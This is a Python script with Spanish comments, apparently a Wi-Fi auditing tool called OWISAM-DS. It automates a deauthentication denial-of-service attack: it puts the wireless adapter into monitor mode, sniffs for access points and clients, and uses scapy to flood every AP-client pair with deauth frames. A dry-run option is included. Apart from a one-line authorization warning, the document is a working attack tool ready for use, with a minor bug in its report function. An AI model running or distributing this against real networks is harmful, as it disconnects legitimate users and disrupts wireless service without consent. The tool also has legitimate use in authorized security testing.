#!/usr/bin/env python3
"""
OWISAM-DS: Auditoría automática e interactiva de denegación de servicio (DoS) en redes Wi-Fi.

Este script realiza todos los pasos necesarios:
  - Detecta tu adaptador Wi-Fi y lo pone en modo monitor
  - Escanea APs y clientes automáticamente
  - Pregunta interactivamente parámetros de ataque y modo (simulación o real)
  - Ejecuta el ataque de deautenticación
  - Genera informe opcional en CSV o JSON

Advertencia:
  Solo usar en entornos controlados o con autorización.
"""
import os
import sys
import subprocess
import time
import json
import csv
from scapy.all import sniff, Dot11, RadioTap, Dot11Deauth, sendp


def check_root():
    if os.geteuid() != 0:
        print('[!] Error: debes ejecutar el script como root.')
        sys.exit(1)


def find_wireless_interfaces():
    """Devuelve lista de interfaces con soporte 802.11."""
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.split('\n'):
        if 'IEEE 802.11' in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces


def enable_monitor_mode(iface):
    """Activa modo monitor en la interfaz dada."""
    print(f"[+] Configurando {iface} en modo monitor...")
    subprocess.run(['ip', 'link', 'set', iface, 'down'])
    subprocess.run(['iwconfig', iface, 'mode', 'monitor'])
    subprocess.run(['ip', 'link', 'set', iface, 'up'])


def scan_network(interface, timeout):
    print(f"[+] Escaneando red en {interface} durante {timeout}s...")
    packets = sniff(iface=interface, timeout=timeout)
    aps, clients = set(), set()
    for pkt in packets:
        if pkt.haslayer(Dot11):
            d = pkt.getlayer(Dot11)
            if d.type == 0:
                if d.subtype in (8,5) and d.addr2:
                    aps.add(d.addr2)
                elif d.subtype == 4 and d.addr2:
                    clients.add(d.addr2)
    return aps, clients


def perform_deauth(interface, aps, clients, count, interval, dry_run):
    mode = 'SIMULACIÓN' if dry_run else 'EJECUCIÓN'
    print(f"[!] {mode} de {count} paquetes por par AP-cliente, intervalo={interval}s")
    total = 0
    for ap in aps:
        for cl in clients:
            pkt = RadioTap()/Dot11(addr1=cl, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
            if dry_run:
                print(f"[DRY] AP={ap}->Cliente={cl}: {pkt.summary()}")
            else:
                sendp(pkt, iface=interface, count=count, inter=interval, verbose=False)
            total += count
    print(f"[+] Paquetes {'simulados' if dry_run else 'enviados'}: {total}")
    return total


def generate_report(aps, clients, total, duration, path):
    data = {
        'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S'),
        'interface': iface,
        'aps_detectados': len(aps),
        'clientes_detectados': len(clients),
        'paquetes_totales': total,
        'duracion_segundos': round(duration,2)
    }
    if path.endswith('.json'):
        with open(path, 'w') as f: json.dump(data, f, indent=4)
    elif path.endswith('.csv'):
        with open(path, 'w', newline='') as f:
            w = csv.DictWriter(f, fieldnames=data.keys())
            w.writeheader(); w.writerow(data)
    print(f"[+] Informe guardado en {path}")


def main():
    check_root()
    ifaces = find_wireless_interfaces()
    if not ifaces:
        print('[!] No se detectó ninguna interfaz inalámbrica.')
        sys.exit(1)
    print('[+] Interfaces inalámbricas detectadas:')
    for idx, i in enumerate(ifaces): print(f"  {idx}: {i}")
    sel = input('Selecciona interfaz (número): ')
    try:
        idx = int(sel); iface = ifaces[idx]
    except:
        print('[!] Selección inválida.'); sys.exit(1)

    enable_monitor_mode(iface)

    timeout = int(input('Tiempo de escaneo (s) [15]: ') or 15)
    aps, clients = scan_network(iface, timeout)
    print(f"[+] APs detectados ({len(aps)}): {', '.join(aps) or 'Ninguno'}")
    print(f"[+] Clientes detectados ({len(clients)}): {', '.join(clients) or 'Ninguno'}")
    if not (aps and clients):
        print('[!] Pocos APs/clientes para DoS'); sys.exit(1)

    dry = input('Modo simulación? (s/N): ').lower().startswith('s')
    count = int(input('Paquetes por par [50]: ') or 50)
    interval = float(input('Intervalo entre paquetes (s) [0.1]: ') or 0.1)

    start = time.time()
    total = perform_deauth(iface, aps, clients, count, interval, dry)
    elapsed = time.time() - start

    if input('Generar informe? (s/N): ').lower().startswith('s'):
        path = input('Ruta informe (.json/.csv) [report.json]: ') or 'report.json'
        generate_report(aps, clients, total, elapsed, path)
    print(f"[+] Auditoría completa en {round(elapsed,2)}s")

if __name__ == '__main__':
    main()
